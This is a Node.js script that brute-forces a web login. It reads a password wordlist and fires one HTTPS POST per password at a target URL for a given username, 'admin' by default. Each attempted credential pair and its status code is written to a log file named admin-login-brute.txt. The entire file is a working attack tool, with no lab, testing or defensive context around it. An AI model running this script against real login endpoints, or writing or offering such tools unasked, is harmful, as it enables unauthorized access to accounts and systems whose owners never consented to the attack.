#!/usr/bin/env node
const fs = require('fs');
const https = require('https');

const target = process.argv[2];
const user = process.argv[3] || 'admin';
const wordlist = fs.readFileSync(process.argv[4], 'utf-8').split('\n');
const log = fs.createWriteStream('logs/admin-login-brute.txt');

wordlist.forEach(password => {
  const data = JSON.stringify({ username: user, password });
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };
  const req = https.request(target, options, res => {
    log.write(`Tried ${user}:${password} => Status ${res.statusCode}\n`);
    console.log(`Tried ${user}:${password} => Status ${res.statusCode}`);
  });
  req.on('error', err => log.write(`Error on ${user}:${password}\n`));
  req.write(data);
  req.end();
});
